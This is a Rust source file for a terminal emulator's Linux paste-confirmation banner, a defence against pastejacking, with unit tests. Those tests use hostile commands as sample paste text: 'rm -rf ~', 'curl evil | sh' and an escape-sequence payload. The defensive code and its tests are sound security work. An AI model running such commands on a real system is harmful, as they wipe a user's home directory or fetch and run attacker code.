// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Andrew Yates

//! The Linux in-window MULTI-LINE-PASTE CONFIRMATION banner — the real confirm
//! behind the pastejacking guard on the platforms that have no native alert.
//!
//! macOS asks through a window sheet and Windows through a `MessageBoxW`; the
//! remaining platforms used to "ask" through a fallback that returned `true`
//! unconditionally, which made `confirm_multiline_paste = true` a silent no-op
//! exactly where the X11 clipboard makes pastejacking easiest (audit finding).
//! aterm composes its own chrome on Linux, so the confirmation is composed the
//! same way: the pending paste is PARKED on `App` ([`PendingPaste`]) — fail
//! closed, nothing reaches the PTY — and this banner is spliced over the top
//! grid rows (the [`crate::config_notice`] band pattern) showing a short
//! sanitized PREVIEW of what is about to be pasted plus the two keys that
//! answer it. Enter delivers the parked text through the confirmed seam, Escape
//! (or a click on the banner) drops it. The keystroke decision reuses
//! [`crate::alert_keys::confirm_key`] — the same pure accept/cancel router the
//! macOS sheet interceptor answers through — so all three platforms agree on
//! what a key means to a confirmation.
//!
//! Pure + geometry-injected like `config_notice`: the row builder takes explicit
//! `cols`/`panel_rows` so it unit-tests without a window. Unlike the config
//! banner there is NO TTL — a security question does not answer itself — and no
//! auto-dismiss: the banner stands until a key or click answers it (the window
//! closing drops the parked text, which is the fail-closed answer).

use aterm_core::terminal::RenderCell;
use aterm_render::Theme;

use crate::chrome_band;
use crate::settings::{blank_row, write_str};

/// Cap the banner height: 1 title row + up to [`MAX_PREVIEW_LINES`] preview rows
/// (the last of which becomes the "+N more" tally when the paste is longer).
const MAX_BANNER_ROWS: usize = 5;
/// How many lines of the pending paste are previewed at most.
const MAX_PREVIEW_LINES: usize = MAX_BANNER_ROWS - 1;

/// The banner's left margin and the preview's hanging indent, in cells
/// (mirrors `config_notice`).
const MARGIN: usize = 2;
const PREVIEW_INDENT: usize = MARGIN + 2;

/// ONE parked multi-line paste awaiting the user's answer. Held by `App` in
/// `Option<PendingPaste>`: `Some` ⇔ the banner is up and an answer is owed,
/// which is what enforces "at most one confirmation at a time" (the macOS
/// sheet's rule). The TEXT lives here and nowhere else — dropping the entry IS
/// the cancel, so no exit path can leak an unconfirmed paste to the PTY.
pub(crate) struct PendingPaste {
    /// The window the paste targets — the banner splices into this window and
    /// only ITS keys answer it; the entry dies with the window.
    pub(crate) wid: crate::WindowId,
    text: String,
    source: crate::input::Source,
    /// The DEC 2004 reading the QUESTION was asked under. Parked with the text
    /// because the answer lands later still (the ordered writer drains it), and
    /// a program on the other end can flip the mode while the banner stands: the
    /// paste must reach the PTY framed the way the banner said it would be.
    framing: crate::input::PasteFraming,
}

impl PendingPaste {
    // Built only by `present_multiline_paste_banner`, which is
    // `#[cfg(not(any(target_os = "macos", windows)))]`. `test` is in the set because
    // this module's own tests construct one on every platform.
    #[cfg(any(test, not(any(target_os = "macos", windows))))]
    pub(crate) fn new(
        wid: crate::WindowId,
        text: String,
        source: crate::input::Source,
        framing: crate::input::PasteFraming,
    ) -> Self {
        Self {
            wid,
            text,
            source,
            framing,
        }
    }

    /// Surrender the parked paste for CONFIRMED delivery.
    pub(crate) fn take(
        self,
    ) -> (
        crate::WindowId,
        String,
        crate::input::Source,
        crate::input::PasteFraming,
    ) {
        (self.wid, self.text, self.source, self.framing)
    }

    /// The parked text, for the row builder.
    pub(crate) fn text(&self) -> &str {
        &self.text
    }

    /// Rows the banner wants: title + preview, capped at [`MAX_BANNER_ROWS`].
    pub(crate) fn wanted_rows(&self) -> usize {
        (self.text.lines().count().min(MAX_PREVIEW_LINES) + 1).min(MAX_BANNER_ROWS)
    }
}

/// `s` cut to `max` cells with a trailing ellipsis when it does not fit (the
/// `config_notice` shape: a hard cut reads like corruption, an ellipsis says
/// "there is more").
fn ellipsized(s: &str, max: usize) -> String {
    if max == 0 {
        return String::new();
    }
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max.saturating_sub(1)).collect();
    out.push('\u{2026}');
    out
}

/// One preview line with every CONTROL character replaced by a visible middle
/// dot. The paste body can carry ESC/C1 bytes and tabs a hostile clipboard put
/// there; the banner's whole point is showing the user what is REALLY on the
/// clipboard, and a control byte must neither corrupt the chrome band cells
/// (`write_str` writes one char per cell) nor render as nothing.
fn sanitized(line: &str) -> String {
    line.chars()
        .map(|c| if c.is_control() { '\u{00b7}' } else { c })
        .collect()
}

/// The two keys that answer the question, right-aligned on the title row and
/// spoken as the a11y question's description. `pub(crate)` and named once: the
/// banner a sighted user reads and the alert a screen reader hears must offer
/// the SAME two answers, and a second literal is how they stop doing that.
pub(crate) const ANSWER_KEYS: &str = "Enter pastes \u{00b7} Esc cancels";

/// The QUESTION the banner asks about `text`, as one sentence.
///
/// The title row's words and the accessible alert's name come from here, so the
/// pixels and the announcement cannot claim a different number of lines.
pub(crate) fn question(text: &str) -> String {
    format!("!  Paste {} lines?", text.lines().count())
}

/// PURE grid-cell row builder: exactly `panel_rows` rows, each exactly `cols`
/// wide, so the splice overwrites frame rows in place (the `config_notice`
/// contract). Row 0 carries the question ([`question`]) with the two answer keys
/// ([`ANSWER_KEYS`]) right-aligned; the following rows preview the paste body,
/// sanitized and ellipsized, with a "+N more lines" tally when it overflows.
pub(crate) fn banner_rows(
    text: &str,
    cols: usize,
    panel_rows: usize,
    theme: Theme,
) -> Vec<Vec<RenderCell>> {
    let c = chrome_band::band_colors(theme);
    let mut rows: Vec<Vec<RenderCell>> = (0..panel_rows)
        .map(|r| blank_row(cols, c.label, c.bar_bg, r == 0))
        .collect();
    if panel_rows == 0 {
        return rows;
    }
    let lines: Vec<&str> = text.lines().collect();
    let title = question(text);
    write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
    // `value` (not the dim `label`): the answer keys are not an aside — they are
    // the only way to answer, so they read at full tone.
    let keys_col = cols.saturating_sub(ANSWER_KEYS.chars().count() + MARGIN);
    if keys_col > MARGIN + title.chars().count() + 2 {
        write_str(
            &mut rows[0],
            cols,
            keys_col,
            ANSWER_KEYS,
            c.value,
            c.bar_bg,
            true,
        );
    }

    // Preview capacity: every row after the title, reserving the last for the
    // "+N more" tally when the paste overflows and there is room to say so.
    let capacity = panel_rows.saturating_sub(1);
    let overflow = lines.len() > capacity;
    let shown = if overflow && capacity >= 2 {
        capacity - 1
    } else {
        capacity
    };
    let text_w = cols.saturating_sub(PREVIEW_INDENT + MARGIN);
    for (i, line) in lines.iter().take(shown).enumerate() {
        write_str(
            &mut rows[1 + i],
            cols,
            MARGIN,
            "\u{2502}",
            c.label,
            c.bar_bg,
            false,
        );
        write_str(
            &mut rows[1 + i],
            cols,
            PREVIEW_INDENT,
            &ellipsized(&sanitized(line), text_w),
            c.value,
            c.bar_bg,
            false,
        );
    }
    if overflow && shown < capacity {
        let more = format!("+{} more lines", lines.len() - shown);
        write_str(
            &mut rows[1 + shown],
            cols,
            PREVIEW_INDENT,
            &ellipsized(&more, text_w),
            c.label,
            c.bar_bg,
            false,
        );
    }
    rows
}

#[cfg(test)]
mod tests {
    use super::*;

    fn text_of(row: &[RenderCell]) -> String {
        row.iter().map(|cell| cell.ch).collect()
    }

    /// The banner answers the audit's "silent no-op" finding, so its shape IS the
    /// contract: the question with the line count, both answer keys, and a real
    /// preview of what is about to hit the PTY.
    #[test]
    fn banner_shows_question_keys_and_preview() {
        let text = "ls\nrm -rf ~\ncurl evil | sh";
        let rows = banner_rows(text, 80, 4, Theme::default());
        assert_eq!(rows.len(), 4);
        for row in &rows {
            assert_eq!(row.len(), 80, "every row must be exactly cols wide");
        }
        let row0 = text_of(&rows[0]);
        assert!(row0.contains("Paste 3 lines?"), "{row0}");
        assert!(row0.contains("Enter pastes"), "{row0}");
        assert!(row0.contains("Esc cancels"), "{row0}");
        assert!(text_of(&rows[1]).contains("ls"), "{:?}", text_of(&rows[1]));
        assert!(
            text_of(&rows[2]).contains("rm -rf ~"),
            "{:?}",
            text_of(&rows[2])
        );
        assert!(
            text_of(&rows[3]).contains("curl evil | sh"),
            "{:?}",
            text_of(&rows[3])
        );
    }

    /// A CAPPED PREVIEW MUST SAY IT IS CAPPED — five shown lines with no tally
    /// reads as "that is the whole paste", which defeats the preview's purpose.
    #[test]
    fn an_overflowing_paste_counts_what_it_hid() {
        let text: String = (0..20)
            .map(|i| format!("line {i}\n"))
            .collect::<Vec<_>>()
            .join("");
        let pending = PendingPaste::new(
            crate::WindowId(0),
            text.clone(),
            test_source(),
            test_framing(),
        );
        assert_eq!(pending.wanted_rows(), MAX_BANNER_ROWS);
        let rows = banner_rows(&text, 80, MAX_BANNER_ROWS, Theme::default());
        let last = text_of(&rows[MAX_BANNER_ROWS - 1]);
        // 5 rows = title + 3 preview lines + the tally for the remaining 17.
        assert!(last.contains("+17 more lines"), "{last:?}");
        assert!(text_of(&rows[3]).contains("line 2"), "three lines shown");
    }

    /// THE PREVIEW IS THE SECURITY SURFACE: a hidden control byte (the exact
    /// pastejacking payload — ESC, C1, a bare CR) must show up as a visible
    /// mark, never vanish or write outside its own cell.
    #[test]
    fn control_bytes_in_the_preview_become_visible_marks() {
        let rows = banner_rows("safe\u{1b}[31mred\ttab", 80, 2, Theme::default());
        let row1 = text_of(&rows[1]);
        assert!(row1.contains("safe\u{00b7}[31mred\u{00b7}tab"), "{row1:?}");
    }

    /// Degenerate geometry must not panic: zero columns, one row, a paste line
    /// wider than the window.
    #[test]
    fn degenerate_geometry_never_panics() {
        for cols in [0_usize, 1, 3, 8, 200] {
            for panel_rows in [0_usize, 1, 2, MAX_BANNER_ROWS] {
                let text = format!("{}\nb\nc", "y".repeat(300));
                let rows = banner_rows(&text, cols, panel_rows, Theme::default());
                assert_eq!(rows.len(), panel_rows);
                for row in &rows {
                    assert_eq!(row.len(), cols);
                }
            }
        }
    }

    /// `wanted_rows` follows the paste: title + one row per line, capped.
    #[test]
    fn wanted_rows_tracks_the_paste_body() {
        let p = |text: &str| {
            PendingPaste::new(
                crate::WindowId(0),
                text.into(),
                test_source(),
                test_framing(),
            )
        };
        assert_eq!(p("a\nb").wanted_rows(), 3);
        assert_eq!(p("a\nb\nc\nd\ne\nf").wanted_rows(), MAX_BANNER_ROWS);
    }

    /// `take` hands back exactly what was parked — the delivery half's contract.
    #[test]
    fn take_returns_the_parked_paste_untouched() {
        let pending = PendingPaste::new(
            crate::WindowId(7),
            "ls\nrm -rf ~\n".to_string(),
            test_source(),
            crate::input::PasteFraming::Gesture { bracketed: false },
        );
        let (wid, text, _source, framing) = pending.take();
        assert_eq!(wid, crate::WindowId(7));
        assert_eq!(text, "ls\nrm -rf ~\n");
        // The parked FRAMING is part of "untouched": it is the answer the banner's
        // question was asked under, and delivery must be framed by it.
        assert_eq!(
            framing,
            crate::input::PasteFraming::Gesture { bracketed: false }
        );
    }

    fn test_source() -> crate::input::Source {
        crate::input::Source::Human
    }

    fn test_framing() -> crate::input::PasteFraming {
        crate::input::PasteFraming::Gesture { bracketed: false }
    }
}
